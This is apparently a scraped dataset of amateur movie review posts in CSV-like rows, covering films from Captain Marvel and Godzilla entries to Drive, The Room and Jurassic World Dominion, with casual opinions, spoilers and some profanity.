The stage is finally set for the climax. Nick, Coulson, the Tesseract, and the Skrulls are on Earth, which is about to be bombed. Yon-Rogg, who believes that Carol is too dangerous to leave alone, plugs her into the Supreme Intelligence to set her straight. Not only is there a ticking clock, but there’s also a chance that everything Carol has gone through will be lost. Her duty to protecting innocent people and her fear will all be tested.

Inside the Supreme Intelligence, Carol meets Lawson again, though Carol refuses to believe her. Lawson gets angry at her and begins to diminish her. She exposes her fear of the unknown, calling it a childish fear, tells her that her comedy is just to cover up the mistake she was, and her powers were the only things that made her worth saving. During this, we see Carol shed a tear. However, after mentioning the last part, Carol looks up to her confidently. She says to the SI, “That’s where you’re wrong. I had a life before this,” she slowly begins to stand up, and SI Lawson gets a worried look on her face, “I meant enough to people to make them cry when they thought I died. I had the bravery to sacrifice myself to save my home.” she slowly begins to float, her eyes glowing orange. “I had the humor to distract my friends from the horrible world people-- things-- like you created. I had the resilience to lose my powers and still try to save an innocent race you are trying to kill. What makes me special isn’t my ability to shoot fire from my hands. What makes me special is my will to fight for what’s right. To protect innocent people from getting hurt by terrorists. To protect them from getting hurt by you.”

Carol regains her powers and they have the fight between SI and her, coming out with Carol on top. On the outside world, nothing is happening, though one member of the Starforce notices the wires linking Carol to the SI smoking. They take her out, and she falls on the floor, seemingly dead.

Yon-Rogg orders one of the members to check her pulse, and when he touches her hand, she grabs him and looks up at him with her orange glowing eyes. She takes care of the Starforce, but Yon-Rogg runs to his ship and flies away from Earth as Ronan’s bombers arrive. Carol catches up to him and crashes his ship back on Earth in the desert. The two watch as Ronan drops the bombs.

Yon-Rogg gets mad at Carol, telling her that there’s no way she can stop the bombs and that she’s doomed both of them. Carol prepares to fly toward them, and Yon-Rogg says, “you can’t be serious! You can’t stop those!” Carol replies, “Maybe, but if not, I’ll die trying.” She flies toward the bombs, destroys them, and destroys one of Ronan’s ships, making the others leave.

She returns to Earth to fight Yon-Rogg, who finds that his weapons have been damaged in the crash. He tells her to finally prove she can beat him in a real fight, and instead of blasting him against a rock as she so overwhelmingly did in the movie, she takes the offer and actually fights him. It’s a pretty even fight, both of them drawing blood, but eventually, Yon-Rogg ends up on top of her. “I told you that you could never beat me,” he says to her. “I know. But they can,” Carol says and points behind him. The Skrulls come over the hill, pull Yon-Rogg off of Carol and begin attacking him, not devastatingly, but enough to keep him on the ground. Carol returns to Nick, and the movie goes as usual, though we don’t see Yon-Rogg get sent back by Carol.

Changes to the End Credit Scenes

The last two changes have to do with the end credits scenes. First, the second end credits scene where Goose throws up the Tesseract is so unnecessary that I am moving it up to take place at the end of the movie. It’s no longer the second end credits scene. Instead, the last end credits scene would be Talos in prison on Hala. Yon-Rogg, who has recently returned from Earth, visits his cell and, after staring intently at each other, opens his cell. Talos is at first confused but realizes what is going on when Yon-Rogg turns into his wife, who was disguised. The two escape Hala and meet up with the rest of the Skrull.

Conclusion

That would be the end of my movie. In theory, it would be better than the Captain Marvel we got, but we’ll never know. As I said before, this was just an exercise. If you take anything away from this, it's that you should not judge a movie by what an actor or actress says about it and that every slip-up is a learning experience. Captain Marvel wasn’t a bad movie, but it could have been better. I hope that this essay has presented one way that it could be better.",moviereviews,20926,3876,457,0

The trailer shows what looks to be a humor filled campy big budget shark attack blood fest.  I was expecting maybe a Deep Blue Sea meets Sharknado, the reality is, dead on arrival jokes, a cast lacking any chemistry whatsoever, horrific CGI sharks, bad science, and worst of all... a bad child actor!!!  The story is extremely formulaic relying on pretty much all shark attack/ocean based movies, no surprises, and pretty frakking boring.  Do you still wanna know the story, ok... The deepest spot of the ocean, isnt the deepest spot after all, and with a billionaires money (Rainn Wilson killed the spirit of Dwight K. Shrute with this performance) a group of totally unprepared scientists poke around too far, and you never guess what happens, they get attacked by a giant extinct shark called a megalodon, and get trapped down there, and they need the help of an expendable transporter diver to get em out, but the dumbasses also let the shark out.  Most of the film they just spend chasing the shark around, once in awhile having a bad CGI encounter with a fish.  And the ending...ugh... so bad.

So tonight I went to see the long awaited Bladerunner 2049. I went to the movie with and open mind having not seen the previous movie or read the book the movies were based on, but a big fan of Harrison Ford. Overall, I would have to give the movie a solid ""eh"". There were things I liked, things I didn't like, and things that left me thoroughly dissatisfied.

First of all, let me say that movies have come so far in terms of visual effects. In that way, Bladerunner 2049 is fantastic. I was simply left in awe of the representation of this futuristic world.

The story is, at best, interesting, but I was left with more questions than answers, and I wasn't entirely sure who the antagonist really was by the end of it. 

My biggest complaint has to be the sheer length of the movie. Just shy of a whopping 3 hours with long moments of wide shots of landscape without much action. You can actually feel the seconds tick by. I started missing the timer at the bottom of Netflix or YouTube where I could see just how much more of this I needed to sit through.

With all that said, here is the conclusion and (in my opinion) the most elegant way a review of this movie could go. 

Bladerunner 2049 is like an extensive open world video game with a hundred different threads branching off the main line. But instead of exploring the world and exhausting all of the side quests which give the main storyline depth and clarity, you rush through the main story to get through the end. Ultimately, you're left with large open areas that are beautiful, but with nothing there to keep you there for longer than it takes to get across the map.",moviereviews,1735,325,37,0

1666388689.0,"Choose or day, it can live","As the average armschair faux-reviewer I can confidently say Choose or Die is alright. I like the retro aesthetic, it tells a story in the opening credits that comes back at the end, and overall is pretty solid. There’s not too much filler, so the pace can be a bit fast but it doesn’t bog itself down that much so I can dig it. No reliance on jumpscares which is unfortunately refreshing. The story is alright, nice and simple with admittedly a few lack luster performances but I feel it doesn’t detract too much from an enjoyable hour or so of screen time. 

The supernatural elements aren’t explained too much which I personally am fine with in this self contained story about nostalgia blindness. Leaving it ambiguous doesn’t take me out too much. The ending is fine too, one of those where the viewer gets to go, “Yeah, that’s what I would do.” For better or for worse. Not breaking new ground but at least entertaining for the most part.

1666299412.0,No Time to Die (2021) - Review,"As the fifth and final instalment of Daniel Craig's run as James Bond, No Time to Die is an action spy thriller that concludes the end of an era in suave fashion that is perfectly fitting of the character. Starring Daniel Craig, Lea Seydoux, Rami Malek, Lashana Lynch, Ralph Fiennes, Ben Whishaw, Baomie Harris, Jeffrey Wright, and Ana de Armas, this star studded cast was definitely one of the highlights of the film. While its action-packed plot full of familiar faces succeeded in making No Time to Die an overall enjoyable watch, I personally found the movie to be very flawed, particularly in its runtime and writing of the villain.

1665535368.0,Lyle Lyle Crocodile: A horrible movie with a great cast,"As someone whose had optimism for the children genre these past years (since into the spider verse) this movie was an ultimate disappointment, not because of the cast (which were amazing and were the best fit for the movie) but the plot and direction of the movie itself.

First off in the beginning the first couple scenes didn’t need to be included at all in the movie, I honestly don’t get why they needed to have a backstory.

Secondly Lyle (Voiced by Shawn Mendes) can sing but not talk? It’s these contradictions that make me disappointed with this movie. Also we see the classic kid moving to a new city blip (kid moves to new city (nerdy and or quirky, supportive but out of reach parents, and an animal or new friend that shows him the way. 

Finally I believe that even those this movie has wonderful actors, I would definitely watch something else rather than watch this horrible movie again. The movie has no direction whatsoever and it frankly disappointing in every scene.",moviereviews,986,174,12,0
1665256922.0,The Shawshank Redemption (1994),"MQA (Movie Quality Algorithm): 8.83/10

Non Mathematical Ranking: 9.2/10

This film absolutely earns its 1st place position on IMDb, It’s twists and turns will leave you head spinning. The main Andy and Red’s arcs are handled beautifully and are as fleshed out as can be when only 2 hours and a half. Most of the side characters that populate Shawshank only end up feeling like filler, especially the blonde guy. The only side character that truly stood out was Brooks who’s story provided an excellent commentary on those who spend their whole lives in prison only to be freed near the end of those lives.   


This plot and all it’s twists and turns will leave your head spinning. I can think of countless moments though out the film that are like this. When Andy gets held over the roof by the roof by that guard or when the Elvis impersonator looking kid got shot. This movie is truly a roller coaster. The movie can become slow, but think of any movie that long that doesn’t.",moviereviews,980,175,16,0
1664347185.0,Unsolicited Movie Reviews: Crimes of the Future (2022),"I walked into the theater with a hope of seeing a dark, noir thriller. I left that night both satisfied and unsettled thanks to Crimes of the Future. Set in a not-so-distant dystopian future, this movie expresses the dichotomy of avant-garde vs. kitsch through the idea of art as the mutation (and subsequent removal) of human organs. 

Brace yourself for close-ups of flesh being cut open and tumors being handled like religious objects of reverence. If you can get by that, you can begin to appreciate what Director David Cronenberg is trying to do. The idea that both our individuality as well as our progress as humans should not be hindered or stymied by societal pressures and governmental agencies. That just because something is called wrong or broken (who came up with those labels anyway?) doesn’t mean we should accept it as such. That the only way we can move forward (and even survive) as humans is to do as our curious minds have always done and experiment. Go against the status quo! 

A very dark and cerebral screenplay is accompanied by a cutting and electric soundtrack brought to us by none other than the great Howard Shore. Shoutout to Viggo Mortensen who looked an awful lot like Strider in a couple shots as well as Kristen Stewart who crushed it as the nerdy fan girl.

1664036452.0,Don't Worry Darling Harry Styles Accent Explained (it makes sense),"In *Don't Worry Darling,* Harry Styles's accent sparked a lot of discussions. A lot of people criticized his indistinct accent and wrote him off as a trainwreck of an actor but turns out that his muddy accent was an intentional artistic choice and his acting is actually quite decent.

If you've not yet seen the movie and don't want it spoiled for you, don't go any further cuz I'm going to explain why Harry Styles's accent makes sense within the plot of Don't Worry Darling.

LAST WARNING - SPOILERS AHEAD!!!

Don't Worry Darling takes place in a utopian world named Victory which is actually a simulation. In the real world, Jack (played by Harry Styles) is an unemployed deadbeat married to Alice, an overworked doctor.

In the real world, Jack has an American accent.

After being influenced by the manipulative cult leader, Frank, about an ideal Utopian world, Victory, where men could feel important again, Jack drags Alice against her will into this experiment and forges a new identity for himself.

In the Victory world simulation, Jack is well-shaven, successful, and British by choice. He configured his ideal self to be British because being British is more exotic and interesting for him.

His questionable British accent, while he's in the Victory project, makes sense within the plot because his mind is battling between two different realities. He’s taken on this fictional British dialect but in truth, he’s American. The muddiness of his accent is the result of this psychological battle.

1663156394.0,Hi guys I watched Brahmãstra yesterday and," It is a brilliant movie. Ranbir Kapoor have a great performance as Shiva. Big B as Guru also is great. SRK and Nagarjuna's cameo appearances are good. This movie has some of the best Visual Effects I have ever seen and probably the best in a Bollywood Movie. I really respect how the cast and crew nearly dedicated a decade into this movie. The action sequences were badass. The plot was engaging. The songs were perfect especially ""Dance ka Bhoot"" and ""Deva Deva"".  Ayan Mukerji did a great job as the director of this movie. Mouni Roy gave a great performance as ""Junoon "" I don't get it why people were unnecessarily mocking Mouni Roy when the the official trailer came out. My only criticism from this movie is Alia Bhatt's character Isha screaming Ranbir Kapoor's name every now and then it was really annoying. Another issue is that they showed way too much in the trailer.  I really liked how the post credit scene sets up the future for this film franchise. This movie is unstoppable at the Box Office even the review bombing couldn't Destroy it.   Can't wait for Brahmadev. Thanks for reading 4/5.",moviereviews,1107,196,29,0

1662992423.0,Samaritan,"Full review: [

\----

In today's age of superhero action movies, the following checkboxes are expected to be ticked off: Heavy CGI, a blockbuster ensemble cast, intergalactic cosmic threats, a post credit scenes, awkward and at times cringe humour, a political message and a multiverse (which is often incoherent). The Samaritan does not tick off any of those boxes - and that's what it makes it great. 

Unlike todays superhero movies which are often overcomplicated and sacrifice the art of story telling for the aforementioned criteria, the Samaritan focuses on what makes movies enjoyable. While the movie is not perfect, it does a great job in laying out the foundation of a highly entertaining action movie. Stallone is in his natural element, playing a bitter superhero who has seen better days as the character of Nemesis. The protagonist of the film, Sam, is a child who has turned to a life of crime as a way of survival in a somewhat dystopian city.  The journey these two go on is entertaining, and there is real emotion evoked as the stakes rise and their dynamic gets complicated. The storytelling and writing is also tightly constructed, with very little in the way of blatant exposition or meaningless dialogue. This keeps the story moving along at a good pace, including some good action sequences and elements of mystery throughout the movies run. 

While there are certainly flaws in the Samaritan, including the lack of depth to the stock standard villain's, the lack of tension in the final act and the somewhat predictable twist at the end, the Samaritan strives in it's simple storyline with a lot of heart. In a time where the trend is to create overcomplicated visual blockbusters with political messages, the Samaritan is a great reminder that trying too hard often leads to hollow stories void of emotion. Sometimes the best results come with a focus to what matters, and that's to create a connection with the audience. The Samaritan might just go down as one of the best superhero movies of the year.",moviereviews,2030,344,39,0
1662211098.0,"My review of the 2022 Netflix film, Day Shift!","A movie that had a cool concept and some of the execution was good (in some cases literally), a fun performance by Jamie Foxx, and a fun world to play in.

The world of Day Shift was really pretty cool.  There are so many zombie movies and vampire movies but this one felt unique with it’s vampire hunter union, and it’s creepy contortionist vampires.  The rules and techniques of the world are pretty well established too.

I like the initial simplicity of the plot, a down on his luck vampire hunter has to collect as many fangs as he can in two days to pay for his daughter’s tuition.  It’s a pretty straight forward action movie plot but I think when it starts to divert from it it starts to fall apart.

Jamie Foxx gives a fun performance.  I’ve seen lots of Jamie Foxx movies and I’ve never really loved any of them (same with this one), but I’ve never found him to be anything but hilarious and fun to watch.  He gave a great action and comedic performance.

Dave Franco’s story in the film is where I’m torn.  I liked the buddy cop dynamic between him and Foxx in the first half but a twist happens in the middle that I think kind of kills what little chemistry they have together.  His quirkiness is low-key annoying the whole film but ramps up towards the end.

The action sequences were incredible.  The vampire being contortionists was absolutely creepy and made the fights so unique.  The choreography was slick and seamless.  The action felt very reminiscent of the John Wick films, which JJ Perry the director was the stunt coordinator on, that’s a compliment by the way.

I think the world that was presented in the film was fun but the story inside of it was either too thin or tried to go in too many directions.  A important character to the finale is introduced about an hour in and helps them with little to no convincing.

I think this movie is fun and has great action and world building but falls apart some in the third act.  It is cool movie though and actually could set up a fun series if they tried to get the story down somehow.

1660609297.0,"Godzillathon #19 - Godzilla and Mothra: The Battle for Earth (1992): Feels like a rehashed Mothra (1961), but still good","






Plot: A meteorite comes to Earth and causes a bunch of stuff to happen. Mothra’s egg gets unearthed on Infant Island. An expedition is sent to Infant Island to check out the damage. While they find Mothra’s egg, they also find Mothra’s twin fairies, this time called the Cosmos instead of the Shobijin. The Cosmos were part of a civilization that once lived on Earth. They originally constructed a weather device that controlled the climate, but that led to the creation of Battra. Mothra defended the Cosmos from Battra, but only a few Cosmos survived. The people leading the expedition decide to take the egg to Japan with them, and the Cosmos are okay with that. *I bet nothing could go wrong at all.* The meteorite also woke Battra up, and he causes havoc in Japan. While transporting the egg, the one thing that people went to the theater to see this movie for (Godzilla) lands a surprise attack on them. The egg hatches and the Mothra larva begins to fight Godzilla. Pretty soon, Battra (who is also in his larva form) shows up too… *Fun fact: This movie is the highest grossing entry in the Heisei series.* 



Characters: The characters here aren’t that interesting. While character development is at least attempted, none of the characters really stand out to me. While the divorced parents subplot is kinda cool to see in a Godzilla movie, and the thing with the daughter is touching, none of the characters are that memorable. As enjoyable Megumi Odaka is as Miki Saegusa, she’s not really given that much to do. I will say this though: the opening scene is a set up for the opening scene of *Raiders of the Lost Ark*. I liked that part.



Tone: The same Godzilla fun, but this time more calm because of the stuff with Mothra.




Music: The music is a mix of terror and wonder. Some of my favorites include: “Main Title”, “The Giant Egg in Tow”, “Sacred Springs”, “Rolling Titles/Ending”, “Mahara Mothra”, and “Mesa March”.



Godzilla and other monsters: Godzilla is cool as always, but he doesn’t feel that important in the movie. I mean, he’s always awesome, but this movie treats him more of an afterthought. Mothra’s back, and she’s been given new abilities: she can shoot lightning from her wings and her scales can reflect energy attacks. After the success of this movie, Mothra would star in the *Rebirth of Mothra* trilogy. Although he’s basically the evil Mothra, Battra is a really cool monster. Like Mothra, he starts out as a larva that turns into an imago form. To me, Battra was one of those monsters that when I first looked at him, I immediately thought he was cool, and after seeing this movie, I was right. He has a great scene when he causes trouble in Japan at the beginning in the movie. 




In conclusion, this one is pretty good, even if the plot is a rehash of movies we’ve seen before.

1660270358.0,Godzillathon #16 - The Return of Godzilla (1984): A good start to the Heisei series,"





Note: This is the start of the Heisei series, which starts with *The Return of Godzilla* (1984) and ends with *Godzilla Vs. Destoroyah* (1995), with a total of seven movies. *The Return of Godzilla* is a direct sequel to *Godzilla* (1954) and ignores everything in between. Oh, and while it’s on my mind, I think the Heisei series is my favorite series because the effects are really good and made Godzilla go back to his original self, while still making him an anti-hero at the same time. Nothing goofy or anything. Just some of the monsters you grew up watching in a serious manner. Anyways, onto the review!



Plot: Three decades after Godzilla first rampaged Tokyo, a volcanic eruption in the Izu-Oshima Islands awakens a new Godzilla. Godzilla destroys a fishing boat, leaving only one person alive to say that he saw Godzilla during the attack. Not long after, a Soviet nuclear submarine is destroyed, forcing the Japanese government to tell the public that Godzilla has returned. Meanwhile, there’s also the growing threat of nuclear war between the United States and the Soviet Union. After Godzilla makes landfall and destroys a Japanese power plant, Doctor Hayashida discovers a weakness in the monster that may play a part in defeating Godzilla…



Characters: The acting here is good, but not amazing. Ken Tanaka as Goro Maki tries his absolute best, but he isn’t really convincing. I really liked Keiju Kobayashi as the Prime Minister, since he was really good in this movie. Another character I really liked was Steve Martin, played once again by Raymond Burr in the American version. *More on the American version later.*



Tone: Since this is a direct sequel to the original *Godzilla*, the tone from that movie translates into this movie. 



Music: Like the original, the music in this movie is suspenseful and imitating. This is one of the best soundtracks in the series in my opinion, and the dark melodies really help strengthen the tone. Some of my favorites include: “Main Title”, “The Search for the Enemy Begins”, “Godzilla Emerges at the Ihama Nuclear Power Plant”, “The Destruction of the Nuclear Power Plant”, “The Giant Beast Collapses”, “Super High-Rise Rescue”, “Godzilla Vs. The Super-X,” “Godzilla Arrives at Oshima,” “Godzilla Falls into Mt. Mihara,” and “Godzilla Ending”. 



American version: Like I said before, Raymond Burr is in the American version, and he does a great job. When *The Return of Godzilla* came to the USA, it was retitled *Godzilla 1985: The Legend is Reborn*, and new scenes were added in order to “Americanize” the movie. There’s even traces of Dr Pepper throughout the movie! My thoughts on the American version are that it’s good, but the original Japanese version is so much better. Fun fact: for a while, the Japanese version was so hard to find on home media, while the American version could only be found on VHS. *I even own a VHS copy of the American version.* It wasn’t until 2016 that Kraken Releasing finally put the original Japanese version on Blu-Ray and DVD. Even the tagline on the back of the box says “Lost for a Generation…” I agree.



Godzilla: After a nine year rest, Godzilla returns to a new era of movies. Starting off, he has a cool new design, and I like how his new look makes him look tired all the time. I also love his new roar, as it’s more of a animal growling this time. There are shots where he can look menacing, but there are some close up shots where he doesn’t look great. As I’ve mentioned at the beginning, the effects in this era are really good and this movie starts to show it. Just seeing an all new Godzilla causing a good old fashioned rampage puts a smile on my face. 
Also, was I the only one that cried when Godzilla fell down Mount Mihara at the end? 
For this movie, Godzilla is given a new opponent: an anti-war machine called the Super-X. *That’s something I forgot to include in the plot summary.* Now, even though it’s just a war machine, it’s actually pretty cool. It can shoot missiles into Godzilla’s mouth, and it can shoot lasers. The Super-X grew popular enough to come back in at least two more movies as Super-X2 and Super-X3, both with different upgrades. All three machines would also appear in video games and comics.



All in all, this is a good one that returns to the anti-nuclear messages from the original.

Plot: *Oh boy, where do I begin?* A small boy named Ichiro Miki lives with his family in an industrial district of Tokyo. What’s so special about this kid, you may ask? Well, his parents work long hours and he spends time with a toy consultant. Oh, and he has only one friend. I mean, that’s sad and all, but he’s also a monster fan. That’s cool, until he acts annoying about it. Ichiro gets bullied because of it. *Gee, I wonder why.* Ichiro uses his imagination about going to Monster Island where he meets Minilla. Minilla is also able to shrink and grow and also talk to Ichiro. *Yes, you heard me right. TALK. Jesus, I don’t know which one is more annoying in this movie: Minilla or Ichiro.* Anyways, they watch Godzilla fight other monsters, which is just shameless stock footage from other Godzilla movies. Turns out that Minilla has its own bully problems in the form of a new monster called Gabara. While he’s trying to help Minilla, Ichiro has his own problems in reality…


Characters: Annoying


Tone: Childish 


Music: Who cares?


Godzilla and other monsters: Other than the numerous amount of stock footage, I’d say that Godzilla is the only monster that actually doesn’t care that he’s in this movie. 


So yeah, I do not like this movie. There you go. Review’s over. Go home.



Okay, I will say this: the robbers subplot and tying into Ichiro’s own problems is kinda clever. But then again, it’s kinda weird because I thought that violence was never the solution to problems. And Hideyo Amamoto as the kind toy maker is actually a solid performance.

1659384661.0,Last night I saw 21 Bridges,"Let's begin with the fact that this is all my opinion, I am open to and encourage discussion and other stances on this 😀 

Put bluntly, this film was a rather cliché, if not very well produced, action romp. This production though lies mostly with the sets and theatrics over the character work or plot intricacies. 

Chadwick Boseman plays our lead but unfortunately, he is given ill a chance to show his acting prowess as the character writing proves very one dimensional. His primary motivation is his father who mostly inspires his career choice as a police officer. The film also tries to play this as the reason behind his lack of remorse in killing criminals, this is never given an explanation outside of an internal affairs meeting at the beginning of the film and the fire fight at the end. This seems to ignore even the basic principal of show don't tell as throughout the film, Chadwick's character seems to be the only one not shooting, even outside of the (spoiler alert) dirty cops. I would like to reiterate, this is an issue with the character work, not the actors interpretation of the material.

Looking into our criminal characters, their characterisation had a similar inconsistency to it, having them act mostly as a conduit for the plot development in service of the greater ""twist"", if you can call it that. This wouldn't be too big an issue, but their story takes more than half the film, being the better part of 70 minutes if the 90 minute film without so much as touching on the twist. 

Speaking of the twist, it was very surface level and rather obvious from the get go which, while not being an issue in itself, would have been much more impressive if anything outside of the norm was done with it. This twist being (spoilers) that the precinct investigating was actually dealing drugs and were the criminal masterminds all along (insert shock and horror here). 

In all fairness, if you like the classics done well, this film is a perfect representation of the mindless shoot our action films that used to be wide spread. The action set pieces have a decent energy, the score is exceptional, and the establishing shots have a spectacular grime to them, bringing into the foreground the dingy city demestocism that the directors and producer was going for.

In short, which I enjoyed the film, I don't think I would watch it again.",moviereviews,2361,413,46,0

1658877273.0,Review: DRIVE (2011)," 

**The movie I am speaking of is the 2011 Nicolas Winding Refn vehicle (no pun intended), “Drive” which stars that very same actor, add Bryan Cranston, Ron Perlman, Oscar Isaac, & by far my favorite Albert Brooks performance outside of “The Simpsons”. Not many people know this, but it was adapted from a novel written by a science fiction writer from Arkansas named James Sallis in 2005. That's right, you can actually learn some interesting facts to accompany my weighted snark here in Villainous Cinema!**

**Where was I..?**

**When I first heard of this movie, I was living in Gainesville and one of the cooks would not shut the fuck up about it. Yknow when people do that, you tend to not want to even see it. Kind of like people who watched Breaking Bad when that was a thing; it's almost like in order to watch it, you have to sign an agreement that you will tell every single fucking person you meet about it. Bryan Cranston was in that too!**

**It was played at Cannes Film Festival, Refn received a Best Director Award, blah blah blah, etc... Who the fuck cares? It's a fucking awesome movie. Who would have guessed that the sniveling dickhead from “The Notebook” could be a Steve McQueen-esque badass?! I mean, I know I didn't. I think the silver scorpion jacket he wears is supposed to be an homage to McQueen, but do not quote me on that.**

**The soundtrack is pretty dope too, not a very common thing in many movies. I think the last one I really liked was from “Tron: Legacy”, and that was all Daft Punk. This one has a great song that bookends this called “A Real Hero” by College & Electric Youth. Check it out, when you get the chance!**

**There is something kind of funny about this one too: a woman actually sued the production company for a misleading trailer. Apparently, she thought she was going to see a Fast & Furious-style movie. I think I would probably sue anyone who tried to make watch one of those movies tbh..** **Anyways, “Drive” is awesome. It cleaned up at the box office, pulling in 81 million against a 15 million dollar budget. I would give it 5 stars, but that one guy at my old job wouldn't shut the fuck up about it.**

1658605938.0,Godzillathon #3 - King Kong Vs. Godzilla (1962): A legendary monster match up,"


Plot: Mr. Tako, head of a pharmaceutical company, is upset that his show is getting low ratings. Because of this, he sends an expedition team to Faro Island, where they discover the natives worship a god by the name of King Kong. The expedition team decide to take Kong back to Japan, but Kong breaks free and swims off. Meanwhile, a submarine accidentally awakens Godzilla from an iceberg, (keeping in continuity with the end of Godzilla Raids Again), and travels to Japan to cause trouble. Godzilla and Kong eventually meet in the Japanese countryside in a quick appetizer of a battle. The people decide to pit Kong against Godzilla in one final battle on Mount Fuji…


Characters: The characters in this movie are surprisingly pretty memorable. I enjoy watching each character, but my favorite character in the movie has to be Mr. Tako. I just love his energy and his movements. I think that Mr. Tako is supposed to represent the excited little kids in all of us due to how excited he can get during the movie. A good example is when Kong first breaks free while on the raft. Everyone on the ship is freaking out and worried, while Mr. Tako is jumping for joy.


Tone: For me, this is where the tone in Godzilla movies started changing. It used to be dark and serious, but now it’s more light hearted. Sometimes, it can work for some movies I’m the series, and other times it doesn’t. For this movie, it does work. Given that the plot is about making two of the most popular movie monsters fight, you’d expect the tone to be a little silly.


Music: Like most monster movies during this time, the music is a mix of suspense and wonder. The music in this movie helps with the overall cheesiness of the movie. “Main Title”, “Godzilla’s Resurrection”, and “King Kong’s Resurrection” are the ones that I remember from this movie.


King Kong: Kong is clearly the underdog in this movie. While it’s fun seeing him again after his original movie back in 1933, the suit they used for him looks like roadkill. In Kong’s original movie, he was only 24 feet while Godzilla was only 164 feet. For this movie, Kong was bumped up to Godzilla’s size. Since Kong doesn’t have any advantage against Godzilla, they decided to give him the powers of electricity whenever he is struck by lightning. I like how in this movie, Kong has a never give up attitude whenever Godzilla knocks him down.


Godzilla: As opposed to Kong’s suit, Godzilla not only gets a new look, but his suit looks so much better. In this movie, Godzilla is portrayed as a bad guy like he was in past two movies. Godzilla is always entertaining when he shows up on screen, causing destruction and breathing fire. The fight between him and Kong is the main highlight of the movie.


Before I give my final thoughts, I thought that I would acknowledge the American version of the movie and compare that to the original Japanese version. (This review was mainly covering the Japanese version). The American version removes scenes from the Japanese version and replaces them with American actors, which makes the movie drag. One of the dumbest scenes in the American version is when two people are comparing the brains of Kong and Godzilla, and the scientist explains that Godzilla has a small brain like a dinosaur, while Kong has a larger brain, and is therefore “a thinking animal”. The American version also replaces some of the music with music from classic monster movies such as The Wolf Man and The Creature from the Black Lagoon. There was even a rumor going around that there were two different endings to the movie. Supposedly, in the American version, Kong wins, and Godzilla wins in the Japanese version, but it turned out to be false. In the words of Cinemassacre, “So, who wins the fight? Well, that’s for the viewer to decide.”


In conclusion, this is actually one of my favorite monster movies and the fight between two of the most famous movie monsters is a treat.


Rating (Japanese version): 7.5/10

American version: 6/10",moviereviews,3998,701,93,0

1656850726.0,Guessing the Movie by it's Colour Palette is SURPRISINGLY DIFFICULT lol," Anyone else here a fan of movie palettes? They're kind of a new concept that are basically art pieces for movie fans that I've seen gain quite a bit of popularity lately and I even have a few for myself. I recently bought the one for SAW because I'm a huge fan of that first film.   
If you're unaware they're those long stripey style canvases you might've seen online if you're in film buff circles (see the one in the thumbnail of The Matrix for an example) They're pretty much these artistic frame-by-frame designs that depict the dominant colour of each scene from a movie in order. They're pretty cool.

So anyway I thought I'd make a fun little ""challenge video"" where I try to guess the movies by their colour palettes - Which is actually veeeery difficult and I completely embarrass myself here lol. Seriously I do pretty bad hahaha, Feel free to play along and see if you can beat me in my Movie Palette Guessing Game [

1656709992.0,The Room (2003): The best worst movie ever?,"
Movies are moving pictures that people have watched for generations, and have entertained people with their relatable characters, spectacular action scenes, memorable songs, beautiful colors, and can guarantee a good time. People watch movies as a way to escape reality and have been blown away by the different genres that movies offer. As with everything, however, there can be both good and bad movies. Good movies are filled with relatable characters, fun writing, and memorable moments. Bad movies are the same thing, except remove everything that makes a movie good. Now, what point am I trying to make here? Recently, I have watched a movie that is not only bad, but is also considered to be one of the worst movies ever made. What was the movie in question? It was The Room. 

Now, before I sat down and watched the movie, I was already aware of its “reputation”, and the impact it had on pop culture. There’s even a book (and movie) titled The Disaster Artist about the troubled production of the movie. I haven’t read the book or seen the movie yet, but I plan to someday. The Room is what happens when you have an idea for a new movie, but it slowly falls apart when you have to include scenes that don’t add up, dialogue that makes no sense, and acting so atrocious that you question if this is a real movie you’re watching. Well, believe it or not, I actually enjoyed this movie. I know this may come as a shock to some people, but I mainly enjoyed the bad acting, confusing plot, and of course, Tommy Wiseau. In all honesty, I haven’t laughed this hard at an actual comedy movie. I know that this movie has probably been crapped on enough, but I wanted to offer my take on it. 

Plot: Johnny is a successful banker whose fiancé, Lisa, decides to have an affair with Johnny’s best friend, Mark. Oh, and there’s also some subplots that don’t get resolved, but that’s about it. Seriously, characters get randomly introduced in one scene and they don’t show up for the rest of the movie. And speaking of characters…

Characters: When it comes to I’ll just put it slightly: unmemorable. Okay, the only character that I really remember the most is Johnny. He’s only memorable because of Tommy Wiseau’s “amazing” performance. 

Music: I only remember the main theme. There’s really not a lot to talk about. Well, the songs that were used for the sex scenes were interesting. 

Acting: The actors seemed to rush through their lines and hope that they made sense to the audience. In other words, the acting is atrocious.

All in all, The Room is a huge mess of a movie, but an unintentional comedy at the same time.

Rating: 3/10 (+ 1 for Tommy Wiseau’s performance). 4/10 now

Adam Sandler was damn good in this movie. He was a lot better in this than Uncut Gems. Dare I say this is my favorite serious Sandler movie. The story wasn't as formulaic as I was expecting. It certainly has an authentic feel with all the basketball players and coaches in it.

In no way, shape or form would Sandler play at a high level of collegiate basketball. Some of the basketball cameos weren't any good. Looking at you, DR. J and Dirk. 

Overall this is a lot better of a movie than I was expecting. Sandler is vital in the lead role, and the whole movie is solid. 8.3/10

1655713501.0,What is Jurassic World 3?,"Oh Jesus lord _Jurassic World: Dominion_ is somehow even dumber and schlockier than _Fallen Kingdom_. The dialogue is absolutely cringe (Dr Sattler actually says “he slid into my DMs” omg who wrote this dreck), the cgi looks AWFUL in so many scenes (not all mind you, but most), and for the love of god this Saturday morning cartoon parody of Steve Jobs/Tim Cook masquerading as a villian had to be the most comically over the top BS I’ve ever seen from a major studio blockbuster. 

Killer locust and genetic crops? Are you freaking kidding me? 🤦‍♂️ 

You know what I really love in my Jurassic Park sequels? Geopolitics. Like this is the exact plot of The Omen 3! Dude literally unleashed burning dino-locusts into the forest and thought nothing bad would happen. But to add insult to injury, despite all the close calls and chaos everywhere, I honestly felt no suspense for the leads. Nope, everyone had plot armor fasten on tightly and it never budged once. 

On the positive side, Chris Pratt is quite beefy these days, Jesus what a dilf.

Not gonna lie, all the lead actors did incredible, it was great to see all the OG cast members back and the music was great as it always was. 

The animatronics looked…decent. The highest quality children’s museum set pieces ever put to celluloid.

Overall I had a good time, the jokes were great, they didn’t rely TOO heavily on nostalgia, and I think it was better than first Jurassic World. Definitely still behind the rest though.

1654930935.0,Dr. Strange in the Multiverse of Madness Isn't Smart But Is FUN,"At this point, it’s no secret that Marvel movies, despite their generally decent bar of quality they don’t dip below, are starting to sort of blur together, despite their best intentions. Dr. Strange and the Multiverse of Madness is a strangely dichotomous beast, wild and daring one minute, then pat and cloying the next. Fortunately, the best bits come later once the movie’s stopped going through the motions pretending to care about story and character and just starts having fun. 

Video review: [

